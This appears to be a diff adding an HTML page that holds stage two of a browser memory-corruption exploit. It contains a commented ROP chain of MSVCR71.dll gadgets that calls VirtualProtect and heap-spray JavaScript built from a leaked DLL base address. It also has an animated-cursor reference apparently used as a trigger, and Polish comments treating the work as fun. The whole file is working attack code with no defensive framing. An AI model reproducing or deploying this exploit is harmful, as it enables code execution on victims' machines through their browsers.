@@ -1,0 +1,113 @@
+<html>
+<meta id='set'>
+<script type="text/javascript">
+
+/* 
+  Stage 2 - relative rop + nop + shellcode 
+*/
+
+
+/*
+0x7c34 6c0a,	# POP EAX # RETN (MSVCR71.dll
+0x7c37a140,	# Make EAX readable			
+0x7c37591f,	# PUSH ESP # ... # POP ECX # POP EBP # RETN (MSVCR71.dll)
+0x41414141,	# EBP (filler)
+0x7c346c0a,	# POP EAX # RETN (MSVCR71.dll)
+0x7c37a140,	# <- *&VirtualProtect() 
+0x7c3530ea,	# MOV EAX,DWORD PTR DS:[EAX] # RETN (MSVCR71.dll)
+0x7c346c0b,	# Slide, so next gadget would write to correct stack location
+	0x7c376069,	# MOV [ECX+1C],EAX # P EDI # P ESI # P EBX # RETN (MSVCR71.dll)
+	0x41414141,	# EDI (filler)
+       	0x41414141,	# will be patched at runtime (VP), then picked up into ESI
+       	0x41414141,	# EBX (filler)
+	0x7c376402,	# POP EBP # RETN (msvcr71.dll)
+	0x7c345c30,	# ptr to 'push esp #  ret ' (from MSVCR71.dll)
+	0x7c346c0a,	# POP EAX # RETN (MSVCR71.dll)
+	0xfffffdff,	# size 0x00000201 -> ebx, modify if needed
+	0x7c351e05,	# NEG EAX # RETN (MSVCR71.dll)
+	0x7c354901,	# POP EBX # RETN (MSVCR71.dll)
+	0xffffffff,	# pop value into ebx
+	0x7c345255,	# INC EBX # FPATAN # RETN (MSVCR71.dll)
+	0x7c352174,	# ADD EBX,EAX # XOR EAX,EAX # INC EAX # RETN (MSVCR71.dll)
+	0x7c34d201,	# POP ECX # RETN (MSVCR71.dll)
+	0x7c38b001,	# RW pointer (lpOldProtect) (-> ecx)
+	0x7c34b8d7,	# POP EDI # RETN (MSVCR71.dll)
+	0x7c34b8d8,	# ROP NOP (-> edi)
+	0x7c344f87,	# POP EDX # RETN (MSVCR71.dll)
+	0xffffffc0,	# value to negate, target value : 0x00000040, target: edx
+	0x7c351eb1,	# NEG EDX # RETN (MSVCR71.dll)
+	0x7c346c0a,	# POP EAX # RETN (MSVCR71.dll)
+	0x90909090,	# NOPS (-> eax)
+	0x7c378c81,	# PUSHAD # ADD AL,0EF # RETN (MSVCR71.dll)
+*/
+
+
+
+var hold  = document.getElementById('set');
+
+
+function w2a(str) {  /* oh genialne ^^ */
+ 
+     arr = str.split('');
+     ret = '%u'+ arr[4]+arr[5]+arr[6]+arr[7]+'%u'+arr[0]+arr[1]+arr[2]+arr[3];
+     return unescape(ret);
+
+}
+
+
+function heaps() {
+
+  var base = parent.window.baseDll;
+      base = '0x' + base.toString(16) + '0000';
+
+
+   base = parseInt(base);
+
+  CollectGarbage();
+
+  rops = [ /* teraz trzeba troszkę poodejmowac i pododawać - troszkę masochizmu niezaszkodzi */
+           /* oczywiscie mam świadomość że mógłbym olać ten base addres bo ta biblioteka nie ma ASLR-a - ale musi być fun jak to mówią dzieci z poprawczaka */
+          base + 0x6c0a,
+          base + 0x3A140,
+          
+         ];
+
+  var code = w2a(rops[0].toString(16)) + 
+             unescape('%u0000')       +
+             unescape('%u0a4c%u0a0a') + //[ebp + 8] - pointer to unicode string msvcr71.dll 
+             unescape('%ueeee%ueeee') +
+             unescape('%ucccc%ucccc') +   
+             unescape('%ufefe%ufefe');  
+
+    while (code.length < 100000)
+        code = code + code;
+
+    var block = code.substr(0, 64*1024/2);
+
+    for (i=0; i<14; i++) {
+        block += code.substr(0, 64*1024/2);
+    }
+
+    block += code.substr(0, (64*1024/2)-(38/2));
+
+    var heaps = new Array();
+
+    for (i=0; i<120; i++) {
+        heaps[i] = block.substr(0, block.length);
+    }
+
+
+  hold.setAttribute('skwokdowkdokwod',heaps);
+}
+
+
+heaps();
+
+
+</script>
+</meta>
+<body id='expme' style="CURSOR: url('s2.ani')">
+
+
+</body>
+</html>
